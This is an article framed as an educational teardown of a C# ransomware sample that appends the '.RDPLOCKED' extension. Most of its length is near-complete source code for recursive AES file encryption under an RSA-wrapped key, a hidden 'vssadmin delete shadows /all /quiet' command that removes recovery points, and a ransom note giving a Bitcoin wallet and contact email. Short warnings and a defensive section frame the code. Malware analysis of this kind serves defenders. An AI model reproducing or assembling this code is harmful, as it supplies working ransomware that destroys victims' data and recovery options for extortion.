# Analysis of Ransomware Code in C# 🕵️‍♂️

> **⚠️ Warning**: This analysis is for educational purposes only. Creating, distributing, or using ransomware is illegal and unethical, causing significant harm. Do not attempt to run or modify this code outside a controlled, sandboxed environment.

This article dissects a C# ransomware implementation from the `Services.ZagreuS` namespace. The code encrypts files, deletes recovery options, and demands a ransom. Below, we analyze its key components and functions, illustrating each point with the original source code.

## 1. System Information and File Paths 📂

The ransomware collects system details (username, computer name, current directory) and defines paths to user directories for targeted encryption.

**Explanation**: The code uses `Environment` and `Path` classes to gather system information and construct paths to directories like Desktop, Documents, and Pictures. These paths are stored as static strings for use in encryption.

**Code**:
```csharp
public static string username = Environment.UserName;
public static string computerName = Environment.MachineName;
public static string currentDirectory = Directory.GetCurrentDirectory();

public static string driveRoot = "C:\\";
public static string usersPath = "Users\\";
public static string desktopPath = Path.Combine(driveRoot, usersPath, username, "Desktop");
public static string linksPath = Path.Combine(driveRoot, usersPath, username, "Links");
public static string contactsPath = Path.Combine(driveRoot, usersPath, username, "Contacts");
public static string documentsPath = Path.Combine(driveRoot, usersPath, username, "Documents");
public static string downloadsPath = Path.Combine(driveRoot, usersPath, username, "Downloads");
public static string picturesPath = Path.Combine(driveRoot, usersPath, username, "Pictures");
public static string musicPath = Path.Combine(driveRoot, usersPath, username, "Music");
public static string oneDrivePath = Path.Combine(driveRoot, usersPath, username, "OneDrive");
public static string savedGamesPath = Path.Combine(driveRoot, usersPath, username, "Saved Games");
public static string favoritesPath = Path.Combine(driveRoot, usersPath, username, "Favorites");
public static string searchesPath = Path.Combine(driveRoot, usersPath, username, "Searches");
public static string videosPath = Path.Combine(driveRoot, usersPath, username, "Videos");
```

## 2. Cryptographic Settings 🔐

The ransomware uses AES for file encryption and RSA to encrypt the AES key, with specific cryptographic parameters.

**Explanation**: AES (Rijndael) is configured with a 256-bit key, 128-bit block, and CBC mode. Keys are derived using PBKDF2 with a static salt and 2000 iterations. RSA encrypts a random string (used as the AES key) with a hardcoded public key. Encrypted files get a `.RDPLOCKED` extension.

**Code**:
```csharp
public static byte[] passwordSalt = Encoding.ASCII.GetBytes("o6806642kbM7c5");
public static int keyDerivationIterations = 2000;
public static int keySize = 256;
public static int blockSize = 128;
public static int byteSize = 8;

public static string encryptedExtension = ".RDPLOCKED";
public static string publicKey = "BgIAAACkAABSU0ExAAQAAAEAAQAhcEdN3GyQC/d+yxOefc291Rn+tWLZmYa3mLpymM1oEifw24YwQxOfNocjwMeBPtWdnPqDJS0CxtGVhl8PdppGdVLAcaBolgRhE6zoYBink5wJwJbiSj0siwExXoo4TDgNffTw+9BVRp5oIW9/+qgRtP8NQLLJXMkdK7snn38ylA==";
public static string randomString = GenerateRandomString(30);
public static string encryptedKey;
```

## 3. Ransom Details 💰

The ransomware specifies ransom demands, including payment details and attacker contact information.

**Explanation**: It demands $100 in Bitcoin to a hardcoded wallet, provides a contact email, and includes a website. A personal ID (RSA-encrypted key) is generated for each victim.

**Code**:
```csharp
public static string bitcoinWallet = "js97xc025fwviwhdg53gla97xc025fwv";
public static string contactEmail = "rlocked@protonmail.com";
public static string ransomAmount = "100";
public static string website = "http://www.RdpLocker.com/";
public static string encryptedKey;
```

## 4. Configuration Flags ⚙️

Boolean flags control which directories to encrypt, all set to `"False"` by default.

**Explanation**: Flags like `encryptDesktop` and `encryptDocuments` determine which directories are targeted. Since all are `"False"`, no encryption occurs unless modified.

**Code**:
```csharp
public static string encryptLogicalDrives = "False";
public static string encryptDesktop = "False";
public static string encryptLinks = "False";
public static string encryptContacts = "False";
public static string encryptDocuments = "False";
public static string encryptDownloads = "False";
public static string encryptPictures = "False";
public static string encryptMusic = "False";
public static string encryptOneDrive = "False";
public static string encryptSavedGames = "False";
public static string encryptFavorites = "False";
public static string encryptSearches = "False";
public static string encryptVideos = "False";
```

## 5. Target File Extensions 📑

A list of file extensions determines which files to encrypt.

**Explanation**: The ransomware targets a wide range of extensions (e.g., `.txt`, `.docx`, `.jpg`, `.pdf`) to maximize impact.

**Code**:
```csharp
public static string targetExtensions = ".txt.doc.docx.mp3.xls.xlsx.ppt.sql.wmv.mp4.mp3.dll.jar.pptx.odt.jpg.tar.gz.bmp.pbm.rtf.png.csv.sql.mdb.sln.php.avi.mov.flv.amv.mpv.mtv.asp.aspx.html.xml.psd.pdf.exe.rv.rvx.ved.wm.wmv.TXT.JPG.rar.xwmv.wma.midi.fla.pdf.wma.ico.gif.GIF.ogg.mpg.icns.RAR.png.zip.BAT.Exe.c.exe.PNG.7z.exe.EXE.sql.mp4.7z.rar.m4a.wma.avi.wmv.csv.d3dbsp.zip.sie.sum.ibank.t13.t12.qdf.gdb.tax.pkpass.bc6.bc7.bkp.qic.bkf.sidn.sidd.mddata.itl.itdb.icxs.hvpl.hplg.hkdb.mdbackup.syncdb.gho.cas.svg.map.wmo.itm.sb.fos.mov.vdf.ztmp.sis.sid.ncf.menu.layout.dmp.blob.esm.vcf.vtf.dazip.fpk.mlx.kf.iwd.vpk.tor.psk.rim.w3x.fsh.ntl.arch00.lvl.snx.cfr.ff.vpp_pc.lrf.m2.mcmeta.vfs0.mpqge.kdb.db0.dba.rofl.hkx.bar.upk.das.iwi.litemod.asset.forge.ltx.bsa.apk.re4.sav.lbf.slm.bik.epk.rgss3a.pak.bigwallet.wotreplay.xxx.desc.py.m3u.flv.js.css.rb.png.jpeg.txt.p7c.p7b.p12.pfx.pem.crt.cer.der.x3f.srw.pef.ptx.r3d.rw2.rwl.raw.raf.orf.nrw.mrw.ref.mef.erf.kdc.dcr.cr2.crw.cerber.WNCRY.dsewrbg.bay.sr2.srf.arw.3fr.dng.jpe.jpg.cdr.indd.ai.eps.pdf.pdd.psd.dbf.mdf.wb2.rtf.wpd.dxg.xf.dwg.pst.vbs.accdb.mdb.pptm.pptx.ppt.xlk.xlsb.xlsm.xlsx.xls.wps.docm.docx.doc.odb.odc.odm.odp.ods.odt";
```

## 6. Main Execution 🚀

The `Main` method orchestrates the ransomware's actions.

**Explanation**: It enables UAC, deletes shadow copies, encrypts files, and notifies attackers via a website. Errors are caught and displayed as a generic "ERROR" message.

**Code**:
```csharp
[STAThread]
public static void Main()
{
    try
    {
        // Enable UAC via registry modification
        EnableUAC();
        // Delete volume shadow copies to prevent recovery
        DeleteShadowCopies();
        // Encrypt files in specified directories
        EncryptFiles();
        // Delete shadow copies again for redundancy
        DeleteShadowCopies();
        // Notify attackers by opening website
        NotifyViaWebsite();
    }
    catch (Exception)
    {
        MessageBox.Show("ERROR");
    }
}
```

## 7. File Encryption Functions 📜

The ransomware encrypts files in specified directories based on configuration flags.

**Explanation**: `EncryptFiles` checks flags and calls `EncryptDirectory` for each enabled directory. `EncryptDirectory` recursively encrypts files with target extensions and creates ransom notes. `EncryptFile` performs AES encryption on individual files.

**Code**:
```csharp
public static void EncryptFiles()
{
    try
    {
        // Encrypt the random string with RSA and store as Base64
        encryptedKey = Convert.ToBase64String(EncryptRSA(contactEmail, randomString));

        // Encrypt all logical drives if enabled
        if (encryptLogicalDrives == "True")
        {
            foreach (string drive in Directory.GetLogicalDrives())
            {
                if (drive != "C:\\")
                {
                    EncryptDirectory(drive, randomString);
                    CreateRansomNote(drive);
                }
            }
        }

        // Encrypt specific directories if their flags are set to "True"
        if (encryptDesktop == "True")
        {
            EncryptDirectory(desktopPath, randomString);
            CreateRansomNote(desktopPath);
        }
        if (encryptLinks == "True")
        {
            EncryptDirectory(linksPath, randomString);
            CreateRansomNote(linksPath);
        }
        if (encryptContacts == "True")
        {
            EncryptDirectory(contactsPath, randomString);
            CreateRansomNote(contactsPath);
        }
        if (encryptDocuments == "True")
        {
            EncryptDirectory(documentsPath, randomString);
            CreateRansomNote(documentsPath);
        }
        if (encryptDownloads == "True")
        {
            EncryptDirectory(downloadsPath, randomString);
            CreateRansomNote(downloadsPath);
        }
        if (encryptPictures == "True")
        {
            EncryptDirectory(picturesPath, randomString);
            CreateRansomNote(picturesPath);
        }
        if (encryptMusic == "True")
        {
            EncryptDirectory(musicPath, randomString);
            CreateRansomNote(musicPath);
        }
        if (encryptOneDrive == "True")
        {
            EncryptDirectory(oneDrivePath, randomString);
            CreateRansomNote(oneDrivePath);
        }
        if (encryptSavedGames == "True")
        {
            EncryptDirectory(savedGamesPath, randomString);
            CreateRansomNote(savedGamesPath);
        }
        if (encryptFavorites == "True")
        {
            EncryptDirectory(favoritesPath, randomString);
            CreateRansomNote(favoritesPath);
        }
        if (encryptSearches == "True")
        {
            EncryptDirectory(searchesPath, randomString);
            CreateRansomNote(searchesPath);
        }
        if (encryptVideos == "True")
        {
            EncryptDirectory(videosPath, randomString);
            CreateRansomNote(videosPath);
        }
    }
    catch (Exception)
    {
        MessageBox.Show("ERROR");
    }
}

public static void EncryptDirectory(string path, string key)
{
    try
    {
        string[] files = Directory.GetFiles(path);
        string[] directories = Directory.GetDirectories(path);

        foreach (string file in files)
        {
            string extension = Path.GetExtension(file);
            if (targetExtensions.Contains(extension))
            {
                EncryptFile(file, key);
            }
        }

        foreach (string dir in directories)
        {
            EncryptDirectory(dir, key);
            CreateRansomNote(dir);
        }
    }
    catch (Exception)
    {
        // Swallow exceptions to continue encryption
    }
}

public static void EncryptFile(string filePath, string key)
{
    byte[] fileData = File.ReadAllBytes(filePath);
    byte[] keyBytes = Encoding.UTF8.GetBytes(key);
    keyBytes = SHA256.Create().ComputeHash(keyBytes);
    byte[] encryptedData = EncryptAES(fileData, keyBytes);
    File.WriteAllBytes(filePath, encryptedData);
    File.Move(filePath, filePath + encryptedExtension);
}
```

## 8. Cryptographic Operations 🛠️

The ransomware implements AES and RSA encryption.

**Explanation**: `EncryptAES` uses AES-CBC with PBKDF2-derived keys. `EncryptRSA` encrypts the random string with the RSA public key. `LoadPublicKey` imports the RSA key from a Base64 blob.

**Code**:
```csharp
public static byte[] EncryptAES(byte[] data, byte[] key)
{
    using (var ms = new MemoryStream())
    using (var aes = new RijndaelManaged())
    {
        aes.KeySize = keySize;
        aes.BlockSize = blockSize;
        var derive = new Rfc2898DeriveBytes(key, passwordSalt, keyDerivationIterations);
        aes.Key = derive.GetBytes(keySize / byteSize);
        aes.IV = derive.GetBytes(blockSize / byteSize);
        aes.Mode = CipherMode.CBC;

        using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cs.Write(data, 0, data.Length);
            cs.Close();
        }
        return ms.ToArray();
    }
}

public static byte[] EncryptRSA(string data, string key)
{
    using (var rsa = LoadPublicKey(publicKey))
    {
        return rsa.Encrypt(Encoding.UTF8.GetBytes(key), fOAEP: false);
    }
}

public static RSACryptoServiceProvider LoadPublicKey(string key)
{
    var rsa = new RSACryptoServiceProvider();
    byte[] keyBlob = Convert.FromBase64String(key);
    rsa.ImportCspBlob(keyBlob);
    return rsa;
}
```

## 9. System Modifications 🔧

The ransomware modifies the system to elevate privileges and prevent recovery.

**Explanation**: `EnableUAC` modifies the registry to enable User Account Control. `DeleteShadowCopies` removes volume shadow copies using `vssadmin.exe`.

**Code**:
```csharp
public static void EnableUAC()
{
    try
    {
        var processInfo = new ProcessStartInfo("cmd.exe")
        {
            Arguments = "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = false,
            UseShellExecute = true,
            Verb = "runas"
        };
        Process.Start(processInfo);
    }
    catch (Exception)
    {
        // Ignore errors
    }
}

public static void DeleteShadowCopies()
{
    try
    {
        var processInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
        {
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        };
        Process.Start(processInfo);
    }
    catch (Exception)
    {
        // Ignore errors
    }
}
```

## 10. Ransom Note Creation 📝

A ransom note is created in each encrypted directory.

**Explanation**: `CreateRansomNote` writes a `HELP_DECRYPT_YOUR_FILES.txt` file with payment instructions, the Bitcoin wallet, contact email, and personal ID.

**Code**:
```csharp
public static void CreateRansomNote(string path)
{
    string[] ransomNote = {
        "Oops All Of your important files were encrypted Like document pictures videos etc..\r\n" +
        "Don't worry, you can return all your files!\r\n" +
        "All your files, documents, photos, databases and other important files are encrypted by a strong encryption.\r\n" +
        "How to recover files?\r\n" +
        "RSA is a asymmetric cryptographic algorithm, you need one key for encryption and one key for decryption so you need private key to recover your files. It’s not possible to recover your files without private key.\r\n" +
        "The only method of recovering files is to purchase an unique private key. Only we can give you this key and only we can recover your files.\r\n" +
        "What guarantees you have?\r\n" +
        "As evidence, you can send us 1 file to decrypt by email We will send you a recovery file Prove that we can decrypt your file\r\n" +
        "Please You must follow these steps carefully to decrypt your files:\r\n" +
        $"Send ${ransomAmount} worth of bitcoin to wallet: {bitcoinWallet}\r\n" +
        "after payment, we will send you Decryptor software\r\n" +
        $"contact email: {contactEmail}\r\n" +
        $"Your personal ID: {encryptedKey}"
    };
    try
    {
        File.WriteAllLines(Path.Combine(path, "HELP_DECRYPT_YOUR_FILES.txt"), ransomNote);
    }
    catch (Exception)
    {
        // Ignore errors
    }
}
```

## 11. Attacker Notification 🌐

The ransomware notifies attackers by opening a website.

**Explanation**: `NotifyViaWebsite` opens the hardcoded website in the default browser.

**Code**:
```csharp
public static void NotifyViaWebsite()
{
    try
    {
        Process.Start(website);
    }
    catch (Exception)
    {
        // Ignore errors
    }
}
```

## 12. Random String Generation 🎲

A random string is generated for use as the encryption key.

**Explanation**: `GenerateRandomString` creates a 30-character string using a cryptographically secure RNG.

**Code**:
```csharp
public static string GenerateRandomString(int length)
{
    const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    byte[] randomBytes = new byte[length];
    using (var rng = new RNGCryptoServiceProvider())
    {
        rng.GetNonZeroBytes(randomBytes);
    }
    var result = new StringBuilder(length);
    foreach (byte b in randomBytes)
    {
        result.Append(chars[b % chars.Length]);
    }
    return result.ToString();
}
```

## Security Analysis 🛡️

- **Strengths**:
  - Strong AES-256 and RSA encryption.
  - Deletes shadow copies to hinder recovery.
  - Targets many file extensions.
  - RSA-encrypted key requires the attacker's private key.

- **Weaknesses**:
  - All flags are `"False"`, so no encryption occurs by default.
  - Hardcoded salt, public key, and payment details aid defenders.
  - Minimal error handling may cause silent failures.
  - Static Bitcoin wallet and email are traceable.

## Defensive Measures 🛑

1. **Prevention**:
   - Regular offline backups.
   - Endpoint protection software.
   - Application whitelisting.
   - System updates.

2. **Detection**:
   - Monitor for `.RDPLOCKED` file extensions.
   - Detect `vssadmin.exe` execution.
   - Flag traffic to `http://www.RdpLocker.com/`.

3. **Response**:
   - Isolate infected systems.
   - Report Bitcoin wallet to authorities.
   - Restore from backups.

## Conclusion 📌

This ransomware uses robust cryptography but has exploitable weaknesses like hardcoded values and disabled encryption flags. Understanding its mechanics aids in developing defenses. If encountered, report to cybersecurity professionals and avoid executing it.

> **⚠️ Reminder**: Do not use or distribute this code. Legal consequences are severe.